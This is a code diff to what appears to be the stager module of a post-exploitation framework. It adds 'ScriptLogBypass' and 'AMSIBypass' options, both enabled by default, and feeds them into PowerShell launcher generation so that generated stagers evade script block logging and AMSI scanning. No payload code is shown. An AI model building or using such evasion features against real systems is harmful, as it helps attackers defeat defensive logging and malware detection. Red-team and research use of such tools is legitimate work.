@@ -68,6 +68,16 @@ class Stager:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'ScriptLogBypass' : {
+                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass' : {
+                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
             }
         }
 
@@ -104,6 +114,16 @@ class Stager:
         stagerRetries = self.options['StagerRetries']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         pixelTrackURL = self.options['PixelTrackURL']['Value']
+        scriptLogBypass = self.options['ScriptLogBypass']['Value']
+        AMSIBypass = self.options['AMSIBypass']['Value']
+
+        scriptLogBypassBool = False
+        if scriptLogBypass.lower() == "true":
+            scriptLogBypassBool = True
+
+        AMSIBypassBool = False
+        if AMSIBypass.lower() == "true":
+            AMSIBypassBool = True
 
         # generate the python launcher code
         pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
@@ -118,7 +138,7 @@ class Stager:
             pypayload = formStr("str", match)
 
         # generate the powershell launcher code
-        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="powershell", encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="powershell", encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool)
 
         if poshlauncher == "":
             print helpers.color("[!] Error in powershell launcher command generation.")
